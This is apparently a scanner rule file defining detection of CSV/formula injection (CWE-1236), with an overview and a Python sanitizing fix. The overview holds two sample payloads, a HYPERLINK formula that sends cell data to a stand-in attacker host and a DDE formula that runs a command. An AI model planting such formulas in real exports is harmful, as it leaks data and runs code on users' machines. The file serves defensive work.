---
confidence: high
cwe:
    - CWE-1236
description: Detects user-controlled data written to CSV files without sanitization, enabling formula injection in spreadsheet applications.
languages:
    - javascript
    - typescript
    - python
    - go
    - java
    - php
    - ruby
    - kotlin
    - dart
    - zig
    - elixir
name: CSV / Formula Injection (Spreadsheet Injection)
owasp:
    - A03:2025
severity: high
tags:
    - injection
    - csv
    - formula-injection
    - owasp-a03
version: 1.0.0
---

# CSV / Formula Injection

## Overview
When user-controlled data is exported to CSV and a user opens it in Excel/LibreOffice, cells beginning with `=`, `+`, `-`, or `@` are interpreted as formulas. Attackers can inject:
- `=HYPERLINK("https://attacker.com?d="&A1,"Click here")` — exfiltrates data
- `=cmd|' /c calc.exe'!A0` — executes arbitrary commands (DDE attack)

This affects any application that exports CSV without sanitizing cell values.

## Remediation
Prefix dangerous characters with a single quote or tab, or wrap in double quotes:
```python
def sanitize_csv(value):
    if str(value).startswith(('=', '+', '-', '@', '\t', '\r')):
        return "'" + str(value)
    return value
```
